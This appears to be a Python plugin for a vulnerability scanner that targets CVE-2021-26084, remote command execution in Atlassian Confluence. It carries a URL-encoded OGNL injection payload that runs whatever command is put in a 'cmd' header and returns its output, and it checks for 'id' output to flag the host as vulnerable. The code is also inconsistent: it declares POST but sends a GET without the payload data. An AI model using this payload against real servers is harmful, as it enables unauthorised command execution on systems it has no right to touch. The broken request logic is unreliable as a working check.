#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'Atlassian Confluence doenterpagevariables.action 远程命令执行漏洞 CVE-2021-26084',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Content-Type':'application/x-www-form-urlencoded',
      'Cookie':'JSESSIONID=3E654B6F4ADDF325CA2203596BD0115C',
      'cmd':'id',
      }
  target = '/pages/doenterpagevariables.action'
  data = '''
  queryString=%5Cu0027%2B%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName%28%5Cu0022javax.script.ScriptEngineManager%5Cu0022%29.newInstance%28%29.getEngineByName%28%5Cu0022js%5Cu0022%29.eval%28%5Cu0022var+c%3Dcom.atlassian.core.filters.ServletContextThreadLocal.getRequest%28%29.getHeader%28%5Cu0027cmd%5Cu0027%29%3Bvar+x%3Djava.lang.Runtime.getRuntime%28%29.exec%28c%29%3Bvar+out%3Dcom.atlassian.core.filters.ServletContextThreadLocal.getResponse%28%29.getOutputStream%28%29%3Borg.apache.commons.io.IOUtils.copy%28x.getInputStream%28%29%2Cout%29%3Bout.flush%28%29%3B%5Cu0022%29%7D%2B%5Cu0027
  '''
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and "uid" in res.text and "gid" in res.text and "groups" in res.text:
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret